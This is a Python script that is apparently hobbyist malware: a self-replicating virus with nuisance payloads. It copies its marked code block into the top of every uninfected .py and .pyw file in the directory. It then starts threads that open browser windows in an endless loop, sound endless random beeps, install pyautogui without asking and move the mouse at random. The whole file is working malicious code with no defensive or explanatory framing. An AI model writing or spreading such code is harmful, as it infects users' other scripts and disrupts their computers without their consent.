### START ###

import sys
import glob
import webbrowser
import time
import os
import random
import threading


code = []

with open(sys.argv[0],'r') as f:
    lines = f.readlines()

Area = False
for line in lines:
    if line == '### START ###\n':
        Area = True
    if Area:
        code.append(line)
    if line == '### END ###\n':
        break

other_scripts = glob.glob('*.py') +glob.glob('*pyw')

for script in other_scripts:
    with open(script, 'r') as file:
        script_code = file.readlines()
    
    infected = False
    for line in script_code:
        if line == '### START ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        
        with open(script, 'w') as fi:
            fi.writelines(final_code)

# PAYLOAD 1
def window_spam():
    while True:
        webbrowser.open('idiot')
        time.sleep(1)

# PAYLOAD 2
def sound():
    import winsound
    frequency = random.randrange(8000, 10000)
    duration = random.randrange(3000, 10000)
    while True:
        winsound.Beep(frequency, duration)
        time.sleep(1.2)


# PAYLOAD 3
def alert():
    try:
        import pyautogui
    except ImportError:
        os.system('python3 -m pip install pyautogui')
        import pyautogui

    def move_mouse(Duration):
        start = time.time()
        time_elapsed = time.time() - start
        xsize, ysize = pyautogui.size()

        while time_elapsed < Duration:
            x, y = random.randrange(xsize), random.randrange(ysize)
            pyautogui.moveTo(x, y, duration=0.2)
            time_elapsed = time.time() - start

    if  __name__ == "__main__":
        while True:
            move_mouse(120)
            time.sleep(3)


mouse = threading.Thread(target=alert)
spam = threading.Thread(target=window_spam)
sound = threading.Thread(target=sound)
mouse.start()
spam.start()
sound.start()



### END ###